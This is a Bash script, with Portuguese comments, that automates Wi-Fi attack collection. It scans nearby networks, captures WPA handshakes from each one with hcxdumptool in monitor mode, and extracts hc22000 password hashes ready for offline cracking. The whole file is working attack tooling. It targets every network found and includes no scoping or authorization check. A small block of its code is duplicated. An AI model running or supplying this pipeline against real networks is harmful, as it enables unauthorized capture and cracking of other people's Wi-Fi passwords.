#!/bin/bash

echo "[DEBUG] Starting run_full_flow.sh"

# Uso / Ajuda
usage(){
  cat <<EOF
run_full_flow.sh - Orquestra o fluxo HCX (02 -> 03 -> 04 -> 05)

Usage:
  ./run_full_flow.sh            # executa o fluxo completo
  ./run_full_flow.sh --clean    # limpa arquivos temporários e executa
  ./run_full_flow.sh -h|--help  # mostra esta ajuda

O script:
  - executa `02_config.sh` para detectar a interface de monitor
  - executa `03_scan.sh` para escanear redes em wlan0
  - para cada rede encontrada, executa `04_capture.sh` e `05_extrair_hash.sh`
  - salva hashes em arquivo final quando encontrados

Saídas relevantes (em /tmp/data/ANO/MES/DIA/):
  - ANO_MES_DIA_config.out
  - ANO_MES_DIA_scan.out
  - ANO_MES_DIA_capture_*.pcapng
  - ANO_MES_DIA_extract_*.out
  - ANO_MES_DIA_tmp_hashes_*.hc22000
  - ANO_MES_DIA_hashes_all.hc22000

EOF
}

# parse args
if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
  usage; exit 0
fi

echo "[DEBUG] Args parsed"

REPO_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$REPO_DIR"

echo "[DEBUG] Changed to: $(pwd)"

# opção --clean (limpa arquivos temporários)
if [ "$1" = "--clean" ]; then
  echo "[+] Limpando arquivos temporários..."
  rm -f networks.list scan_raw.txt *.done 2>/dev/null || true
fi

echo "[DEBUG] Checking dependencies"

for cmd in iw timeout hcxdumptool hcxpcapngtool; do
  if ! command -v $cmd >/dev/null 2>&1; then
    echo "[!] Aviso: $cmd não encontrado no PATH"
  else
    echo "[DEBUG] Found: $cmd"
  fi
done

echo "[DEBUG] Dependencies checked, starting config"

echo "[+] Executando 02_config.sh para obter monitor iface..."
if [ ! -f "./02_config.sh" ]; then
  echo "[!] Erro: 02_config.sh não encontrado"
  exit 1
fi

MON_IFACE=$(./02_config.sh) || { 
  echo "[!] Falha ao configurar monitor"
  exit 1
}

# prepara diretório de saída em /tmp/data/ANO/MES/DIA e prefixo ANO_MES_DIA_
echo "[DEBUG] Setting up output directory"
YEAR=$(date +%Y)
MONTH=$(date +%m)
DAY=$(date +%d)
DATE_PREFIX="${YEAR}_${MONTH}_${DAY}"
OUT_DIR="/tmp/data/${YEAR}/${MONTH}/${DAY}"
echo "[DEBUG] OUT_DIR: $OUT_DIR"
mkdir -p "$OUT_DIR"

CONFIG_OUT="$OUT_DIR/${DATE_PREFIX}_config.out"
echo "[+] Monitor iface detectada: $MON_IFACE" | tee "$CONFIG_OUT"

echo "[DEBUG] Starting scan"
echo "[+] Executando scan em wlan0..."
SCAN_OUT="$OUT_DIR/${DATE_PREFIX}_scan.out"
./03_scan.sh 2>&1 | tee "$SCAN_OUT"

if [ ! -f networks.list ]; then
  echo "[!] networks.list não foi gerado pelo scan"
  exit 1
fi

echo "[+] Processando redes encontradas..."
while IFS='|' read -r mac ssid channel; do
  SAN_MAC=$(echo "$mac" | sed 's/://g')
  if [ -z "$channel" ]; then channel=6; fi
  DURATION=600  # 10 minutos
  OUT_CAPTURE="$OUT_DIR/${DATE_PREFIX}_capture_${SAN_MAC}.pcapng"
  TMP_HASHES="$OUT_DIR/${DATE_PREFIX}_tmp_hashes_${SAN_MAC}.hc22000"
  EXTRACT_OUT="$OUT_DIR/${DATE_PREFIX}_extract_${SAN_MAC}.out"

  echo "[+] Capturando: SSID='$ssid' MAC=$mac CH=$channel (10 min)"
  
  # Status bar durante captura
  (
    ./04_capture.sh "$mac" "$channel" "$MON_IFACE" $DURATION > "$OUT_CAPTURE" 2>&1
    echo "CAPTURE_DONE" > "/tmp/capture_${SAN_MAC}_status"
  ) &
  CAPTURE_PID=$!
  
  # Mostra progresso
  echo -n "Progresso: ["
  for i in $(seq 1 60); do
    sleep 10  # a cada 10 segundos
    if kill -0 $CAPTURE_PID 2>/dev/null; then
      echo -n "#"
    else
      break
    fi
  done
  echo "] Concluído"
  
  wait $CAPTURE_PID
  rm -f "/tmp/capture_${SAN_MAC}_status" 2>/dev/null || true

  wait $CAPTURE_PID
  rm -f "/tmp/capture_${SAN_MAC}_status" 2>/dev/null || true

  if [ ! -f "$OUT_CAPTURE" ] || [ ! -s "$OUT_CAPTURE" ]; then
    echo "[!] Falha na captura de $mac ou arquivo vazio"
    continue
  fi

  echo "[+] Extraindo hash de $mac"
  ./05_extrair_hash.sh "$OUT_CAPTURE" "$TMP_HASHES" > "$EXTRACT_OUT" 2>&1 || true

  if [ -f "$TMP_HASHES" ] && [ -s "$TMP_HASHES" ]; then
    HASHES_ALL="$OUT_DIR/${DATE_PREFIX}_hashes_all.hc22000"
    echo "[+] Hash encontrado para $mac — salvando em $HASHES_ALL"
    cat "$TMP_HASHES" >> "$HASHES_ALL"
    echo "[+] Hash salvo. Finalizando fluxo."
    echo "[+] Arquivo de hashes: $HASHES_ALL"
    exit 0
  else
    echo "[+] Nenhum hash para $mac — prosseguindo"
  fi
done < networks.list

echo "[+] Varredura completa — nenhum hash encontrado"
exit 0
